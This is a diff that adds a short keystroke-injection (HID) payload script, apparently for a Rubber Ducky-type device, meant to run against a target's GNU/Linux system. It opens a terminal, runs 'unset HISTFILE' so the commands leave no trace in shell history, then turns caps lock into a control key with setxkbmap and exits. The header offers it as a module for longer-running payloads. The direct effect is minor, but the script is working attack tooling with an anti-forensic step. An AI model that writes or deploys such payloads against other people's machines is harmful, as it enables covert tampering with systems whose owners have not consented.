@@ -1,0 +1,16 @@
+REM Title: capslock_disable
+REM Description: Disables capslock on target's system. Can be used as module to craft payloads which requires long time to execute.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution
+REM Target: GNU/Linux.
+REM Attackmodes: HID.
+
+DELAY 1000
+CTRL ALT t
+DELAY 500
+STRING unset HISTFILE
+ENTER
+DELAY 200
+STRING setxkbmap -option ctrl:nocaps && exit
+ENTER
